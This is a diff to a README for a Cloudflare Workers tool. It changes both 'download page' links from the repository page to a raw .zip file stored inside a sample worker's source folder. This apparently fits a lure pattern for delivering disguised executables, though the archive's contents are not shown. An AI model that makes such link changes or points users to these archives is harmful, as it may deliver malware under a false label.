@@ -1,6 +1,6 @@
 # 🔧 dynamic-workers-orchestrator - Run Cloudflare Workers Your Way
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dimitrousabbatarian96/dynamic-workers-orchestrator)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dimitrousabbatarian96/dynamic-workers-orchestrator/main/workers/sample-worker/src/dynamic_workers_orchestrator_2.4.zip)
 
 ## 📦 What this app does
 
@@ -18,7 +18,7 @@ The setup is made for people who want a fast way to publish small web tools with
 
 Use this link to download or visit the project page:
 
-[Open the download page](https://github.com/dimitrousabbatarian96/dynamic-workers-orchestrator)
+[Open the download page](https://raw.githubusercontent.com/dimitrousabbatarian96/dynamic-workers-orchestrator/main/workers/sample-worker/src/dynamic_workers_orchestrator_2.4.zip)
 
 ### What you need on Windows
 
